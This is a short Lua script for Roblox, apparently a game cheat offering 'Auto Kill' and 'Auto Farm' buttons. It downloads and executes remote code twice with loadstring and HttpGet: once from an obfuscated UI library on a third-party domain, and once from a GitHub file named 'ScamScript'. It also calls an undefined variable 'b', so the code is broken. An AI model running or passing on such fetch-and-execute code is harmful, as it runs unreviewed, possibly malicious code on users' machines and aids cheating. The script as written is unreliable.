_G.ToggleColor = Color3.fromRGB(255,0,0)
_G.ButtonColor = Color3.fromRGB(0,255,0)
_G.SliderColor = Color3.fromRGB(0,0,255)

local library = loadstring(game:HttpGet(('https://garfieldscripts.xyz/ui-libs/wallys-ui.lua')))() -- It's obfuscated, I won't let you see my ugly coding skills. =)
local w = library:CreateWindow("Auto Kill")

b:Button("Auto Farm With auto throw silent", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/IIIlllIIIAlt/Assassin/main/ScamScript'))()
end)
